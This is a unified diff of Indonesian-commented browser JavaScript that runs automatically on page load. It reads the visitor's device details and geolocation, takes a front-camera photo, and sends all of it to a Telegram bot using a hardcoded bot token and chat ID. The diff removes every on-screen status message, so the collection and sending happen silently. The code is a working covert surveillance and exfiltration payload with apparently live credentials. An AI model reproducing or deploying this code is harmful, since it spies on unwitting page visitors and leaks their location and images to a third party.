@@ -1,4 +1,3 @@
-const statusList = document.getElementById('status-list');
 const videoEl = document.getElementById('video');
 const canvasEl = document.getElementById('canvas');
 
@@ -6,16 +5,8 @@ const canvasEl = document.getElementById('canvas');
 const botToken = '6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc';
 const chatId = '1265481161';
 
-const updateStatus = (message, isError = false) => {
-  const li = document.createElement('li');
-  li.textContent = message;
-  if (isError) li.className = 'error';
-  statusList.appendChild(li);
-  statusList.scrollTop = statusList.scrollHeight;
-};
-
+// Ambil info perangkat
 const getDeviceInfo = () => {
-  updateStatus('1. Mengambil info perangkat...');
   const data = {
     userAgent: navigator.userAgent,
     platform: navigator.platform || 'N/A',
@@ -38,8 +29,8 @@ const getDeviceInfo = () => {
   }
 };
 
+// Ambil lokasi
 const getLocation = () => {
-  updateStatus('2. Mengambil lokasi...');
   return new Promise((resolve, reject) => {
     if (!navigator.geolocation) {
       reject(new Error('Geolocation tidak tersedia.'));
@@ -59,8 +50,8 @@ const getLocation = () => {
   });
 };
 
+// Ambil foto dari kamera
 const getPhoto = async () => {
-  updateStatus('3. Mengambil foto...');
   const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
   videoEl.srcObject = stream;
   await new Promise(resolve => videoEl.onloadedmetadata = resolve);
@@ -76,6 +67,7 @@ const getPhoto = async () => {
   return photoBase64;
 };
 
+// Kirim semua data ke Telegram
 const sendToTelegram = async (data) => {
   const message = `
 📱 *Perangkat*
@@ -96,7 +88,7 @@ const sendToTelegram = async (data) => {
     })
   });
 
-  // Kirim lokasi sebagai share-location
+  // Kirim lokasi
   await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -107,7 +99,7 @@ const sendToTelegram = async (data) => {
     })
   });
 
-  // Kirim selfie (foto)
+  // Kirim foto
   const blob = await (await fetch(data.photoBase64)).blob();
   const formData = new FormData();
   formData.append('chat_id', chatId);
@@ -119,25 +111,20 @@ const sendToTelegram = async (data) => {
   });
 };
 
+// Jalankan proses
 const start = async () => {
-  updateStatus('Memulai proses...');
   try {
     const data = {};
     data.deviceInfo = await getDeviceInfo();
-    updateStatus('✅ Info perangkat OK');
     data.location = await getLocation();
-    updateStatus('✅ Lokasi OK');
     data.photoBase64 = await getPhoto();
-    updateStatus('✅ Foto OK');
     await sendToTelegram(data);
-    updateStatus('✅ Semua data berhasil dikirim ke Telegram.');
   } catch (err) {
     console.error(err);
-    updateStatus(`❌ Error: ${err.message}`, true);
   }
 };
 
-// Jalankan otomatis setelah halaman siap
+// Jalankan otomatis
 window.addEventListener('DOMContentLoaded', () => {
   start();
 });
